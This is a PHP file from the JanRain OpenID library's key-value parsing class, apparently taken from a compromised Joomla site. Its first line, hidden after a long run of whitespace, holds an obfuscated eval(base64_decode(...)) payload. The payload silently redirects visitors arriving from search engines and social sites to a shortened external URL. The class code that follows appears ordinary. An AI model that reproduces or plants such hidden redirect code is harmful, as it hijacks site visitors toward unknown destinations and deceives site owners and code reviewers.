<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

/**
 * OpenID protocol key-value/comma-newline format parsing and
 * serialization
 *
 * PHP versions 4 and 5
 *
 * LICENSE: See the COPYING file included in this distribution.
 *
 * @access private
 * @package OpenID
 * @author JanRain, Inc. <openid@janrain.com>
 * @copyright 2005-2008 Janrain, Inc.
 * @license http://www.apache.org/licenses/LICENSE-2.0 Apache
 */

// Do not allow direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/**
 * Container for key-value/comma-newline OpenID format and parsing
 */
class Auth_OpenID_KVForm {
    /**
     * Convert an OpenID colon/newline separated string into an
     * associative array
     *
     * @static
     * @access private
     */
    function toArray($kvs, $strict=false)
    {
        $lines = explode("\n", $kvs);

        $last = array_pop($lines);
        if ($last !== '') {
            array_push($lines, $last);
            if ($strict) {
                return false;
            }
        }

        $values = array();

        for ($lineno = 0; $lineno < count($lines); $lineno++) {
            $line = $lines[$lineno];
            $kv = explode(':', $line, 2);
            if (count($kv) != 2) {
                if ($strict) {
                    return false;
                }
                continue;
            }

            $key = $kv[0];
            $tkey = trim($key);
            if ($tkey != $key) {
                if ($strict) {
                    return false;
                }
            }

            $value = $kv[1];
            $tval = trim($value);
            if ($tval != $value) {
                if ($strict) {
                    return false;
                }
            }

            $values[$tkey] = $tval;
        }

        return $values;
    }

    /**
     * Convert an array into an OpenID colon/newline separated string
     *
     * @static
     * @access private
     */
    function fromArray($values)
    {
        if ($values === null) {
            return null;
        }

        ksort($values);

        $serialized = '';
        foreach ($values as $key => $value) {
            if (is_array($value)) {
                list($key, $value) = array($value[0], $value[1]);
            }

            if (strpos($key, ':') !== false) {
                return null;
            }

            if (strpos($key, "\n") !== false) {
                return null;
            }

            if (strpos($value, "\n") !== false) {
                return null;
            }
            $serialized .= "$key:$value\n";
        }
        return $serialized;
    }
}

?>